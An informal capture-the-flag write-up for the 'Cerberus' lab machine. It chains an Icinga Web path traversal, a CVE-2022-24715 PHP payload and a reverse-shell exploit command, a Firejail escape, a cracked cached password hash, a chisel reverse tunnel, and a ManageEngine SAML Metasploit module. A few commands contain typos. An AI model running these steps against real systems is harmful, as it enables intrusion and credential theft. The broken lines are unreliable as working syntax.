## Cerberus  (HARD)

```
Nmap scan report for icinga.cerberus.local (10.10.11.205)
Host is up (0.060s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /icingaweb2/authentication/login?_checkCookie=1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests

```


`http://icinga.cerberus.local:8080/icingaweb2/authentication/login`

so the service is icinga ... lookin [here](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/) i found some interesting things...




`http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini`


This path traversal  exfiltrate matthew password in icinga admin page



## Initial Access Remote Code Execution (CVE-2022-24715)


We are authenticated to the page .. now we have to spawn shell!



The CVE can upload  a .pem file couse it can be uploaed see the article !!



Authenticated users can edit resources to later reference them from other configuration files. One of the resource types is SSH keys, which require to be written to the local filesystem to be used.


We identified that no validation is performed on the parameter user of the SshResourceForm at 1.
It allows attackers to use directory traversal sequences (e.g. ../) to write the SSH key outside of the intended directory at 2:

**application/forms/Config/Resource/SshResourceForm.php**

```php
public static function beforeAdd(ResourceConfigForm $form)
{
    $configDir = Icinga::app()->getConfigDir();
    $user = $form->getElement('user')->getValue();
    $filePath = $configDir . '/ssh/' . $user; // [1]
    if (! file_exists($filePath)) {
        $file = File::create($filePath, 0600);
    // [...]
    $file->fwrite($form->getElement('private_key')->getValue()); // [2]

```

Our first assumption was to consider this bug useless since SSH keys are validated with **openssl_pkey_get_private()**; it doesn't sound easy to craft a PHP script that would also be a valid PEM certificate. 

so the function is located in php-src/ext/openssl

**php-src/ext/openssl/openssl.c**


```c
static EVP_PKEY *php_openssl_pkey_from_zval(zval *val, int public_key, char *passphrase, size_t passphrase_len)
{
   EVP_PKEY *key = NULL;
   X509 *cert = NULL;
   bool free_cert = 0;
   char * filename = NULL;
   // [...]
   } else {
       // [...]       
       if (Z_STRLEN_P(val) > 7 && memcmp(Z_STRVAL_P(val), "file://", sizeof("file://") - 1) == 0) {
           filename = Z_STRVAL_P(val) + (sizeof("file://") - 1);
           if (php_openssl_open_base_dir_chk(filename)) {
               TMP_CLEAN;
           }
       }
           // [...]
           if (filename) {
               in = BIO_new_file(filename, PHP_OPENSSL_BIO_MODE_R(PKCS7_BINARY));
           } else {
               in = BIO_new_mem_buf(Z_STRVAL_P(val), (int)Z_STRLEN_P(val));
           }

```


so if Attackers could then craft a payload in 4 parts:

-    The mandatory prefix to enter the vulnerable code path, file://;
-    Path to a valid PEM certificate on the server, e.g., /usr/lib/python3/dist-packages/twisted/test/server.pem in our test virtual machine;
-    A NULL byte;
-    The contents of the file to write, here a small PHP script executing an external command.


example: 


```
file:///path/to/a/cert.pem\x00<?php system("whoami")>?;
```



found an interesting exploit which seems to do the same things without rewrite the code couse [exploit](https://github.com/JacobEbben/CVE-2022-24715) was public!


STEPS:

`ssh-keygen` creates a .pem 

and then 

```bash
python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I IP -P PORT -u matthew -p IcingaWebPassword2023 -e c0der.pem
```

and we have shell!


### Firejail !


then with linpeas firejail exploit 


other termin firejoin `firejail --join=PID`  and `su -`


now with linpeas found some interesting thing in AD


/etc/sss/sssd.conf


and seems to be a valid thing to communicate with AD


and in /var/lib/sss/db found some string with 

matthew@cerberus.local

and a possible password cached_stored.


$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0


matthew@cerberus.local : 147258369



chisel with socks


evil-winrm with mat passws


user.txt


strange AD program


in config we see 9251 --> 




`chisel server -p 3477 --socks5 --reverse`

`chisel client IP:port R:5000:socks`



https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f


with previous username and password we login successfully



and i find an exploit on the manage engine `CVE-2022-47966`


when login the saml response give us a lot of information


The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server


```
PHNhbWxwOlJlc3BvbnNlIElEPSJfNDNmOGMzZGMtODM0ZC00NTg4LWEyNDYtOTgyMjIyMWZlOTRiIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMy0wNC0wNlQwODo0ODoxNC4wOTBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi82N2E4ZDEwMTY5MDQwMmRjNmE2NzQ0YjhmYzhhN2NhMWFjZjg4YjJmIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfYWU5YjJjYmU1YmVjY2JjOTJkMDlmOTY2N2YxMGQ4MDEiIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxJc3N1ZXIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPmh0dHA6Ly9kYy5jZXJiZXJ1cy5sb2NhbC9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIiAvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24gSUQ9Il8yOWNhODMwYi0yNDE1LTQ0MWUtOTBhZi0zNjNhYWJlNGE3ZmIiIElzc3VlSW5zdGFudD0iMjAyMy0wNC0wNlQwODo0ODoxNC4wOTBaIiBWZXJzaW9uPSIyLjAiIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48SXNzdWVyPmh0dHA6Ly9kYy5jZXJiZXJ1cy5sb2NhbC9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiIC8%2BPGRzOlJlZmVyZW5jZSBVUkk9IiNfMjljYTgzMGItMjQxNS00NDFlLTkwYWYtMzYzYWFiZTRhN2ZiIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiIC8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgLz48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiIgLz48ZHM6RGlnZXN0VmFsdWU%2Bbm13OEFWNjFxUVZ0KzBoZHNjL1NRWCtXN2hYelBXd0NBN2ZxcEdqNHpIRT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2Bd0FjaDU5eXNWaUhKUXRZMmloVmtlYzBhMXhpdjlMOTBQUi9KK3gxdVQ0SzhmRm9IakZOdW5rM0pGTElDR2IzbmZhVGRiODBuWUlaS3JMbE1HQjRpbkhoTDNOVkFQVGIydFovWDhaM1A3TGI5TFdVbEcyLzV0WWd4TllvRjdkRGMycXh2amJOQXRSeHZrYmNQOHdzYXZ1aXROZjVaZytPTytndXgxZGFWNWsxRW1PaUxuQkpUVVRzSktUM0VSWlYzTDE5eEFZZEtUOWt2ajRFMk9iMkxHL2llWGlLc0R0U1pBbUdnVXdvM29Ib1E2eWwybVU3RTZFTkp2cWtMUjVVR2s3cXA1djV0QldsVXJhWThYZVVIS2NodDBtYW9RU1g4STl5WDJKOE1BWnVPcUx2dFI0YWR0SG1SN0dlZmRrcVg2TkZXR0tEWE5WZ0VMR2w4TlhscWNnPT08L2RzOlNpZ25hdHVyZVZhbHVlPjxLZXlJbmZvIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6WDUwOURhdGE%2BPGRzOlg1MDlDZXJ0aWZpY2F0ZT5NSUlDM2pDQ0FjYWdBd0lCQWdJUUpKa29uakthdkp4TkFnd0plcDg4UkRBTkJna3Foa2lHOXcwQkFRc0ZBREFyTVNrd0p3WURWUVFERXlCQlJFWlRJRk5wWjI1cGJtY2dMU0JrWXk1alpYSmlaWEoxY3k1c2IyTmhiREFlRncweU16QXhNekF4TkRFNE1qSmFGdzB5TkRBeE16QXhOREU0TWpKYU1Dc3hLVEFuQmdOVkJBTVRJRUZFUmxNZ1UybG5ibWx1WnlBdElHUmpMbU5sY21KbGNuVnpMbXh2WTJGc01JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBNU5QN0hLS0plNWJhRmtwTDJhNTFEaUFCbWtaSjNQSHRFWFQ2aXh1SzVQZWZERmdLQU9mRlgwMWZSUnUwRFJPS0I3eFhEdEFaQkdMWU4yWWQ2dUVMdHVEb0Z0SUtGUmRHSTdncWgzNC92YmNBeE9aSlZyTlFPMDFmcUVmY0FXQk1OSUs1UC9INHFGdEFIbEl5L2tiSjZNZlI1OWJQclNVNmJQZitRbDVVNUdteHV4a0Y1MjNpOHZHU1ZIdzNIMlZ3ZEI4aGJaT2RXSmdobTVQT0N2em9ub2hkdnpWOWI1U2ZLY2FqYTBJTjd1ZjQ2cGRCS0huaEZOT2R1WmpDTldSUVFGa3B3REttTWw0eG5yYXVob2h3R2JJVTRENzh4MjE5RVE3UVAzSlBzQlBhL2hMVFdjV0dlRDFVczhzY0w3ZTdqcW1CSEpHM2doUnlVNWRubWpoWHhRSURBUUFCTUEwR0NTcUdTSWIzRFFFQkN3VUFBNElCQVFETURwczNWVUdRTjFBOFRRY25TUjhac1p5UzJOZ3l2WXZBdUs2Vmk1cmdmUXhkRWJRSmNMU0xkMFNWM0VhSFZMamo5b2Rkc0VORUVNT3B1QmlkSy9iMnJtZ0tiai9ielVLM0EwQlBsS3ZCQXg5THJNUndwSk1PK0RlMi9nTVFUc2h5bHU0UTRrZGJQMU80ZWVudHpDdXBUNDFYM0xSc2M1RTBMMlA3a3hubDRzQ3RxS3N0TnQ1aUQrNjFYdmM1N3BtV0dnTk9pSkMyS2pxc0pVOEh2L1ozODJXNktpRXBWNjlzNWQ3d1M2emFEemdPOFJucXpMZXRuNFY4UkZzMTRqVnh2dUR0S3p2TitDVVRUYjVteEV5TlJnWU8rNUpsQjVoU2tDWkR2bjBjbWdwWUdwZU4xdjA4SHNweHVoQ1d6cW9UOGR3d0R3bzMzemR6c0JxNVFYWUw8L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBJblJlc3BvbnNlVG89Il9hZTliMmNiZTViZWNjYmM5MmQwOWY5NjY3ZjEwZDgwMSIgTm90T25PckFmdGVyPSIyMDIzLTA0LTA2VDA4OjUzOjE0LjA5MFoiIFJlY2lwaWVudD0iaHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi82N2E4ZDEwMTY5MDQwMmRjNmE2NzQ0YjhmYzhhN2NhMWFjZjg4YjJmIiAvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDIzLTA0LTA2VDA4OjQ4OjE0LjA3NVoiIE5vdE9uT3JBZnRlcj0iMjAyMy0wNC0wNlQwOTo0ODoxNC4wNzVaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi82N2E4ZDEwMTY5MDQwMmRjNmE2NzQ0YjhmYzhhN2NhMWFjZjg4YjJmPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5tYXR0aGV3QGNlcmJlcnVzLmxvY2FsPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48L0F0dHJpYnV0ZVN0YXRlbWVudD48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDIzLTA0LTA2VDA4OjIxOjA2LjE4MloiPjxBdXRobkNvbnRleHQ%2BPEF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0PC9BdXRobkNvbnRleHRDbGFzc1JlZj48L0F1dGhuQ29udGV4dD48L0F1dGhuU3RhdGVtZW50PjwvQXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B
```

samlrespone 
<Issuer>http://dc.cerberus.local/adfs/services/trust</Issuer>






ISSUER_URL : http://dc.cerberus.local/adfs/services/trust



so if we use a msfconsole module `exploit/http/menageengine_adselfservice_plus_saml_rce_cve_2022_47966`


with GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f


and IUSSER found 


we are administrator!!


